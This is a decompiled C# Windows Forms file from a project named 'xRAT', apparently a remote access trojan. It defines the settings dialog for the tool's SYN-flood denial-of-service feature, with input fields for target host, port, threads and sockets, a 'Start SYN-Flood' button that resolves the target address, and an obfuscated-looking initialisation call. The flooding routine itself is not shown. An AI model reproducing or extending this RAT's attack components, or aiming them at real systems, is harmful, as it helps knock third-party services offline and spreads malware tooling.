namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Net;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class SYN : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("GroupBox1")]
        private GroupBox _GroupBox1;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label4")]
        private Label _Label4;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        [AccessedThroughProperty("Label3")]
        private Label daxawBwCf;
        private IContainer icontainer_0;

        public SYN()
        {
            Class1.QaIGh5M7cuigS();
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.TextBox1.Text.Contains("http://www."))
                {
                    IPHostEntry hostEntry = Dns.GetHostEntry(this.TextBox1.Text.Replace("http://www.", string.Empty));
                    this.TextBox1.Text = hostEntry.AddressList[0].ToString();
                }
                else if (this.TextBox1.Text.Contains("www."))
                {
                    IPHostEntry entry4 = Dns.GetHostEntry(this.TextBox1.Text.Replace("www.", string.Empty));
                    this.TextBox1.Text = entry4.AddressList[0].ToString();
                }
                else if (this.TextBox1.Text.Contains("http://"))
                {
                    IPHostEntry entry2 = Dns.GetHostEntry(this.TextBox1.Text.Replace("http://", string.Empty));
                    this.TextBox1.Text = entry2.AddressList[0].ToString();
                }
                else
                {
                    IPHostEntry entry3 = Dns.GetHostEntry(this.TextBox1.Text);
                    this.TextBox1.Text = entry3.AddressList[0].ToString();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(SYN));
            this.Button1 = new Button();
            this.GroupBox1 = new GroupBox();
            this.TextBox1 = new TextBox();
            this.Label1 = new Label();
            this.TextBox2 = new TextBox();
            this.Label2 = new Label();
            this.Label3 = new Label();
            this.TextBox3 = new TextBox();
            this.Label4 = new Label();
            this.TextBox4 = new TextBox();
            this.GroupBox1.SuspendLayout();
            this.SuspendLayout();
            Point point = new Point(13, 0x6b);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            Size size = new Size(0x139, 0x21);
            this.Button1.Size = size;
            this.Button1.TabIndex = 0;
            this.Button1.Text = "Start SYN-Flood";
            this.Button1.UseVisualStyleBackColor = true;
            this.GroupBox1.Controls.Add(this.TextBox4);
            this.GroupBox1.Controls.Add(this.Label4);
            this.GroupBox1.Controls.Add(this.TextBox3);
            this.GroupBox1.Controls.Add(this.Label3);
            this.GroupBox1.Controls.Add(this.TextBox1);
            this.GroupBox1.Controls.Add(this.Label1);
            this.GroupBox1.Controls.Add(this.TextBox2);
            this.GroupBox1.Controls.Add(this.Label2);
            point = new Point(12, 12);
            this.GroupBox1.Location = point;
            this.GroupBox1.Name = "GroupBox1";
            size = new Size(0x13a, 0x5c);
            this.GroupBox1.Size = size;
            this.GroupBox1.TabIndex = 12;
            this.GroupBox1.TabStop = false;
            this.GroupBox1.Text = "SYN-Flood Settings";
            point = new Point(0x30, 0x19);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0xfb, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 0;
            this.TextBox1.Text = "127.0.0.1";
            this.Label1.AutoSize = true;
            point = new Point(9, 0x1c);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            size = new Size(0x21, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 1;
            this.Label1.Text = "Host:";
            point = new Point(0x30, 0x33);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            size = new Size(0x36, 0x15);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 2;
            this.TextBox2.Text = "80";
            this.Label2.AutoSize = true;
            point = new Point(9, 0x36);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x1f, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 6;
            this.Label2.Text = "Port:";
            this.Label3.AutoSize = true;
            point = new Point(0x6d, 0x36);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(50, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 7;
            this.Label3.Text = "Threads:";
            point = new Point(0x9e, 0x33);
            this.TextBox3.Location = point;
            this.TextBox3.Name = "TextBox3";
            size = new Size(0x35, 0x15);
            this.TextBox3.Size = size;
            this.TextBox3.TabIndex = 8;
            this.TextBox3.Text = "20";
            this.Label4.AutoSize = true;
            point = new Point(0xdb, 0x36);
            this.Label4.Location = point;
            this.Label4.Name = "Label4";
            size = new Size(0x2b, 13);
            this.Label4.Size = size;
            this.Label4.TabIndex = 9;
            this.Label4.Text = "Socket:";
            point = new Point(0x105, 0x33);
            this.TextBox4.Location = point;
            this.TextBox4.Name = "TextBox4";
            size = new Size(0x26, 0x15);
            this.TextBox4.Size = size;
            this.TextBox4.TabIndex = 10;
            this.TextBox4.Text = "10";
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0x151, 0x9e);
            this.ClientSize = size;
            this.Controls.Add(this.GroupBox1);
            this.Controls.Add(this.Button1);
            this.FormBorderStyle = FormBorderStyle.Fixed3D;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "SYN";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "SYN-Flood";
            this.GroupBox1.ResumeLayout(false);
            this.GroupBox1.PerformLayout();
            this.ResumeLayout(false);
        }

        private void TextBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            int num = Strings.Asc(e.KeyChar);
            if (((num < 0x30) || (num > 0x39)) && (num != 8))
            {
                e.Handled = true;
            }
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual GroupBox GroupBox1
        {
            get
            {
                return this._GroupBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox1 = value;
            }
        }

        public object HOST
        {
            get
            {
                return this.TextBox1.Text;
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this.daxawBwCf;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.daxawBwCf = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return this._Label4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label4 = value;
            }
        }

        public object PORT
        {
            get
            {
                return this.TextBox2.Text;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                KeyPressEventHandler handler = new KeyPressEventHandler(this.TextBox2_KeyPress);
                if (this._TextBox2 != null)
                {
                    this._TextBox2.KeyPress -= handler;
                }
                this._TextBox2 = value;
                if (this._TextBox2 != null)
                {
                    this._TextBox2.KeyPress += handler;
                }
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return this._TextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox3 = value;
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return this._TextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox4 = value;
            }
        }
    }
}

